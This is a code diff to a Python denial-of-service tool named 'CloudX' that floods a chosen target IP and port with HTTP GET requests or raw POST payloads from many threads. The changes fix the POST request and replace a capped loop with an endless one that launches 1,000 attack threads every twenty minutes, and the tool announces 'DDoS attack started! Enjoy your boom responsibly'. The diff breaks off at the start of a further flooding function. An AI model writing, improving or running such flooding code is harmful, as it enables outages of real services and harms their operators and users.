@@ -2,7 +2,6 @@ import threading
 import socket
 import sys
 import ssl
-import socket
 import os
 import urllib.request
 import urllib.error
@@ -11,7 +10,7 @@ import time
 
 os.system('clear')
 print("POST Method is currently being fixed and it is error right now, please use GET instead.")
-logo="""
+logo = """
 < =============== >
       CloudX
 ^ <=============> ^
@@ -46,9 +45,9 @@ if method == "":
 
 # Construct attack parameters
 headers = {
-'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
-'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-'Connection': 'close'
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Connection': 'close'
 }
 
 USER_AGENT_PARTS = {
@@ -92,26 +91,32 @@ def attack(ip, port, threadNum):
     request = urllib.request.Request(url, None, headers)
     while True:
         try:
-            if method  == "GET":
+            if method == "GET":
                 urlsocket_file = urllib.request.urlopen(request)
                 print("[*] Thread (%s) | Attack Sent!" % (threadNum))
             else:
                 s.connect((ip, int(port)))
-                s.sendto(("GET /%s HTTP/1.1\r\n" % (url)).encode('utf-8'), (ip, int(port)))
-                s.sendto("Host: %s\r\n\r\n" % (url), (ip, int(port)))
+                payload = ("POST /%s HTTP/1.1\r\n" % (url)).encode('utf-8')
+                payload += ("Host: %s\r\n" % (url)).encode('utf-8')
+                payload += "Content-Length: 0\r\n".encode('utf-8')
+                payload += "\r\n".encode('utf-8')
+                s.sendto(payload, (ip, int(port)))
                 s.close()
                 print("[*] Thread (%s) | Attack Sent!" % (threadNum))
         except urllib.error.URLError as e:
-            print("[*] Thread (%s) | Error! seems like CloudX can't reach the target url!" % (threadNum))
+            print("[*] Thread (%s) | Error! seems like CloudX can't reach the target URL!" % (threadNum))
             print("[*] Thread (%s) | Attack stopped." % (threadNum))
             break
-for i in range(int(numberOfThreads)):
-    threading.Thread(target=attack, args=(ip,port,i)).start()
-    if i >=  48999:
-        sys.exit()
 
-print("[+] DDos attack started! Enjoy your 'boom' responsibly! 💣🔥")
-time.sleep(0.10)
+def workers():
+    while True:
+        for i in range(1000):
+            threading.Thread(target=attack, args=(ip, port, i)).start()
+        time.sleep(1200)
+
+threading.Thread(target=workers).start()
+
+print("[+] DDoS attack started! Enjoy your 'boom' responsibly! 💣🔥")
 
 def flood_url():
     while True:
